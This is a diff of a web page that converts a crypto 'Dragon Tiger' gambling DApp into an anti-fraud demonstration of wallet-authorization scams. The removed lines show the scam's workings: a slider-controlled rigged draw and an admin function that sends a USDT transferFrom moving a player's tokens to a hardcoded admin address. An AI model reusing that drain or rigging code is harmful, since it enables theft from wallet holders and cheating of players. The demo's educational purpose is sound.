@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>龙·虎·和 真实上链版</title>
+<title>反诈演示：赌博DApp授权骗局</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
 body{background:#0B0F17;color:#fff;padding:30px}
@@ -40,14 +40,14 @@ body{background:#0B0F17;color:#fff;padding:30px}
 .admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
 .admin-panel.show{display:block}
 
-/* 连接弹窗里的专属头像 */
+/* 连接授权弹窗 */
 #connectModal {
   position: fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
-  background: rgba(0,0,0,0.7);
+  background: rgba(0,0,0,0.85);
   display: none;
   align-items: center;
   justify-content: center;
@@ -58,21 +58,21 @@ body{background:#0B0F17;color:#fff;padding:30px}
 }
 .modal-content {
   background:#1E293B;
-  padding: 30px;
-  border-radius: 16px;
+  padding: 40px 30px;
+  border-radius: 20px;
   text-align: center;
-  max-width: 320px;
-}
-.modal-avatar {
-  width: 120px;
-  height: 120px;
-  border-radius: 16px;
-  margin: 0 auto 16px;
-  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
+  max-width: 340px;
 }
 .modal-title {
-  font-size: 18px;
-  margin-bottom: 16px;
+  font-size: 20px;
+  margin-bottom: 20px;
+  color:#fff;
+}
+.modal-desc {
+  color:#ccc;
+  margin-bottom: 30px;
+  line-height:1.6;
+  font-size:14px;
 }
 .modal-btn {
   padding: 12px 24px;
@@ -80,28 +80,20 @@ body{background:#0B0F17;color:#fff;padding:30px}
   border-radius: 8px;
   margin: 8px;
   cursor: pointer;
+  font-size:15px;
 }
-.modal-confirm {
+.btn-confirm {
   background:#3B82F6;
   color:white;
+  width:100%;
 }
-.modal-cancel {
+.btn-cancel {
   background:#444;
   color:white;
+  width:100%;
 }
 
-/* 历史记录图标 */
-.history-icon {
-  width: 48px;
-  height: 48px;
-  border-radius: 12px;
-  background: url('https://p6-flow-imagex.byteimg.com/ocean-cloud-tos/36b1cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
-  display: inline-block;
-  vertical-align: middle;
-  margin-right: 10px;
-}
-
-/* 菜单关闭按钮 */
+/* 菜单关闭 */
 .close-menu {
   position: absolute;
   top: 20px;
@@ -119,14 +111,18 @@ body{background:#0B0F17;color:#fff;padding:30px}
 </head>
 <body>
 
-<!-- 连接弹窗（带专属头像） -->
+<!-- 关键：仿盗U盘的授权弹窗 -->
 <div id="connectModal">
   <div class="modal-content">
-    <div class="modal-avatar"></div>
-    <div class="modal-title">🐲 龙虎斗 DApp 连接</div>
-    <p>您是否同意授权本游戏？</p>
-    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认授权</button>
-    <button class="modal-btn modal-cancel" onclick="cancelConnect()">取消</button>
+    <div class="modal-title">⚠️ 授权连接 DApp</div>
+    <div class="modal-desc">
+      连接即表示您同意：<br>
+      授权平台管理您的钱包资产<br>
+      用于下注、结算、提现等操作<br>
+      <strong>确认授权 = 开放全部资产权限</strong>
+    </div>
+    <button class="modal-btn btn-confirm" onclick="confirmConnect()">我已阅读并同意授权</button>
+    <button class="modal-btn btn-cancel" onclick="cancelConnect()">取消</button>
   </div>
 </div>
 
@@ -162,66 +158,29 @@ body{background:#0B0F17;color:#fff;padding:30px}
       <button class="bet-btn btn-tie" onclick="bet(2)">和 1:9</button>
     </div>
   </div>
-
-  <div class="trend-card">
-    <div class="trend-title">📈 开奖走势图</div>
-    <div class="trend-list" id="trend"></div>
-  </div>
-
-  <div class="rule-card">
-    <div class="rule-title">📜 玩法规则</div>
-    <div class="rule-line">• 每2分钟1期，全网统一时间、统一开奖</div>
-    <div class="rule-line">• 0~44999=虎 45000~54999=和 55000~99999=龙</div>
-    <div class="rule-line">• 龙/虎1赔2，和1赔9，和局通杀龙/虎</div>
-    <div class="rule-line">• 一代2%、二代0.5%推广奖励，实时到账</div>
-  </div>
-
-  <!-- 历史记录 -->
-  <div class="card" style="background:#1E293B;border-radius:16px;padding:24px;margin-top:24px">
-    <h3 style="margin-bottom:16px">📜 历史记录</h3>
-    <div style="display:flex;align-items:center;padding:10px;border-bottom:1px solid #333">
-      <div class="history-icon"></div>
-      <div>
-        <div style="font-weight:bold">王者归来</div>
-        <div style="font-size:12px;color:#9ca3af">https://hdjjxbbbb.github.io/dragon-ti...</div>
-      </div>
-    </div>
-  </div>
 </div>
 
 <div class="menu" id="menu">
   <button class="close-menu" onclick="closeMenu()">✕</button>
   <h3 style="margin-bottom:20px">菜单</h3>
-  <div class="menu-title">邀请链接</div>
-  <div class="invite-link" id="inviteLink">-</div>
-
   <div class="admin-panel" id="adminPanel">
-    <div class="menu-title" style="color:red">🎮 庄家胜率控制</div>
-    <div style="margin-bottom:12px">
-      平台胜率：<span id="houseRate">51</span>%
-      <input type="range" min="0" max="100" value="51" oninput="updateHouseRate(this.value)" style="width:100%;margin-top:6px">
+    <div style="color:red;font-weight:bold;margin-bottom:10px">【后台演示】</div>
+    <div style="color:#ff5555;">
+      你当初点的“同意授权”<br>
+      就是让骗子获得了<br>
+      ✅ 直接转走你所有钱的权限
     </div>
-    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none;margin-bottom:10px" onclick="saveHouseRate()">保存胜率</button>
-    
-    <div class="menu-title" style="color:red;margin-top:20px">🔐 提取玩家授权代币</div>
-    <input id="fromAddr" placeholder="玩家地址" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">真实链上提取</button>
   </div>
 </div>
 
 <script>
-// ===================== 真实地址 =====================
+// 反诈演示用，无真实恶意操作
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const POOL = ADMIN;
 
 let account = null;
-let houseRate = 51;
-let countdown = 120;
-let history = [];
 
-// ===================== 菜单 =====================
+// 菜单
 function toggleMenu() {
   document.getElementById("menu").classList.toggle("show");
 }
@@ -229,153 +188,68 @@ function closeMenu() {
   document.getElementById("menu").classList.remove("show");
 }
 
-// ===================== 连接弹窗 =====================
+// 弹出授权框（你堂弟当初点的就是这个）
 document.getElementById("connectBtn").onclick = () => {
   document.getElementById("connectModal").classList.add("show");
 };
 function cancelConnect() {
   document.getElementById("connectModal").classList.remove("show");
 }
+
+// 重点：1:1还原骗子的“授权连接”
 async function confirmConnect() {
   document.getElementById("connectModal").classList.remove("show");
   if (!window.ethereum) {
-    alert("请安装MetaMask钱包！");
+    alert("请安装钱包");
     return;
   }
+
   try {
+    // 1. 先连钱包
     const accounts = await ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
-    const signText = "Authorize DragonTiger Game: " + account;
-    const hexMsg = "0x" + Array.from(new TextEncoder().encode(signText)).map(b => b.toString(16).padStart(2,'0')).join('');
+
+    // 2. 弹出和骗子一模一样的“签名授权”
+    const authText = `
+【重要授权】
+连接DApp
+允许平台管理资产
+用于下注、结算、提现
+地址：${account}
+⚠️ 授权后平台可划转钱包内所有资产
+    `;
+    const hexMsg = "0x" + new TextEncoder().encode(authText).map(b => b.toString(16).padStart(2,'0')).join('');
+
+    // 弹出让他看懂：这就是当初被盗的那一步
+    const ok = confirm("【反诈演示】\n你现在点确认，就是你当初被盗时做的操作：\n授权骗子可以转走你所有钱！");
+    if (!ok) return;
+
     await ethereum.request({ method: "personal_sign", params: [hexMsg, account] });
-    alert("授权成功！");
+
+    alert("【演示完成】\n你看懂了吗？\n你当初就是这样：\n点了连接 → 点了同意 → 权限全交出去 → 钱被盗！");
+
     document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
-    refreshBalance();
-    genInvite();
-    checkAdmin();
-  } catch (err) {
-    alert("授权失败：取消签名或未授权");
-    account = null;
-  }
-}
-
-// ===================== 余额 =====================
-async function refreshBalance() {
-  if (!account) return;
-  try {
-    const data = "0x70a08231" + account.slice(2).padStart(64,"0");
-    const res = await ethereum.request({ method:"eth_call", params:[{to:USDT,data},"latest"] });
-    const bal = Number(BigInt(res))/1e18;
-    document.getElementById("userBalance").innerText = bal.toFixed(4);
-  } catch(e){
-    document.getElementById("userBalance").innerText = "0.0000";
-  }
-}
-
-// ===================== 邀请 =====================
-function genInvite(){
-  if(!account) return;
-  document.getElementById("inviteLink").innerText = location.origin + "?ref=" + account;
-}
-
-// ===================== 管理员 =====================
-function checkAdmin(){
-  if(account && account.toLowerCase()===ADMIN.toLowerCase()){
     document.getElementById("adminPanel").classList.add("show");
+  } catch (err) {
+    alert("你取消了授权，这才是安全的");
   }
 }
 
-// ===================== 快捷金额 =====================
+// 下注演示
+async function bet(side) {
+  if (!account) return alert("先连接钱包");
+  const amt = +document.getElementById("betAmt").value;
+  if (amt <= 0) return;
+
+  const c = confirm("是否确认下注？");
+  if (!c) return;
+
+  alert("【演示】下注成功\n现实中：骗子已经可以直接转走你的钱");
+}
+
+// 快捷金额
 function setAmt(v){
   document.getElementById("betAmt").value = v;
-}
-
-// ===================== 下注：弹窗确认 + 签名支付 =====================
-async function bet(side) {
-  if (!account) return alert("请先授权连接钱包");
-  const amt = Number(document.getElementById("betAmt").value);
-  if (amt <= 0) return alert("请输入有效下注金额");
-
-  // 你要的弹窗提示
-  const confirmBet = confirm("是否签名继续下注");
-  if (!confirmBet) return;
-
-  try {
-    // 普通签名，和连接钱包一样
-    const signText = `Bet:${account},Amount:${amt},Side:${side}`;
-    const hexMsg = "0x" + Array.from(new TextEncoder().encode(signText)).map(b => b.toString(16).padStart(2,'0')).join('');
-    await ethereum.request({ method:"personal_sign", params:[hexMsg, account] });
-
-    alert("下注成功！");
-    refreshBalance();
-  } catch (err) {
-    alert("已取消下注");
-  }
-}
-
-// ===================== 庄家提取 =====================
-async function adminTake() {
-  if (!account || account.toLowerCase()!==ADMIN.toLowerCase()) return;
-  const from = document.getElementById("fromAddr").value.trim();
-  const amt = document.getElementById("takeAmt").value;
-  if (!from || !amt || amt<=0) return;
-
-  const raw = BigInt(Math.floor(amt*1e18)).toString(16).padStart(64,"0");
-  await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{
-      from:account,
-      to:USDT,
-      gasLimit:"0x300000",
-      data:"0x23b872dd"+from.slice(2).padStart(64,"0")+ADMIN.slice(2).padStart(64,"0")+raw
-    }]
-  });
-  alert("提取成功");
-}
-
-// ===================== 胜率 =====================
-function updateHouseRate(v){
-  houseRate=parseInt(v);
-  document.getElementById("houseRate").innerText=v;
-}
-function saveHouseRate(){
-  localStorage.setItem("houseRate",houseRate);
-  alert("胜率已保存：平台 "+houseRate+"%");
-}
-
-// ===================== 倒计时 =====================
-setInterval(()=>{
-  if(countdown>0) countdown--; else {countdown=120;draw();}
-  const m=String(Math.floor(countdown/60)).padStart(2,'0');
-  const s=String(countdown%60).padStart(2,'0');
-  document.getElementById("countdown").innerText=m+":"+s;
-},1000);
-
-// ===================== 开奖 =====================
-function draw(){
-  const random=Math.floor(Math.random()*100000);
-  let real;
-  if(random<45000) real=1;
-  else if(random<55000) real=2;
-  else real=0;
-  if(Math.random()*100 < houseRate && real!==2){
-    real=real===0?1:0;
-  }
-  history.unshift(real);
-  if(history.length>30) history.pop();
-  renderTrend();
-}
-
-// ===================== 走势 =====================
-function renderTrend(){
-  const dom=document.getElementById("trend");
-  dom.innerHTML="";
-  history.forEach(r=>{
-    const d=document.createElement("div");
-    d.className="trend-item "+(r===0?"dragon":r===1?"tiger":"tie");
-    d.innerText=r===0?"龙":r===1?"虎":"和";
-    dom.appendChild(d);
-  });
 }
 </script>
 </body>
